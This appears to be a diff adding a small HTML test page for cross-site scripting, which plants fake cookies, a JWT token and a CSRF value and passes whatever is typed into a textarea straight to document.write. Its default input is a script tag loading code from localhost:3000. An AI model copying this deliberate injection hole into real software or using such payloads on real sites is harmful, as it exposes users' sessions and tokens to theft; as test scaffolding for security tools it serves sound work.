@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Simple XSS Test</title>
+</head>
+
+<body style="background:#111;color:#fff;font-family:sans-serif;padding:40px;">
+    <h1>Simple XSS Test</h1>
+    <p>Inject payload and click Submit:</p>
+
+    <textarea id="input" rows="3"
+        style="width:100%;max-width:600px;padding:10px;background:#222;color:#0f0;border:1px solid #333;font-family:monospace;">&lt;script src=//localhost:3000&gt;&lt;/script&gt;</textarea>
+    <br><br>
+    <button onclick="inject()"
+        style="padding:10px 30px;background:#0f0;color:#000;border:none;cursor:pointer;font-size:16px;">Submit
+        (document.write)</button>
+
+    <script>
+        // Set test data
+        document.cookie = 'secret=admin_cookie_value';
+        document.cookie = 'session=xyz123';
+        localStorage.setItem('token', 'jwt_secret_token');
+        sessionStorage.setItem('csrf', 'csrf_value');
+
+        function inject() {
+            var payload = document.getElementById('input').value;
+            // Use document.write which WILL execute script tags
+            document.write('<html><head><title>Injected</title></head><body style="background:#111;color:#fff;padding:40px;">' + payload + '<p style="margin-top:20px;color:#888;">Payload injected via document.write</p></body></html>');
+            document.close();
+        }
+    </script>
+</body>
+
+</html>
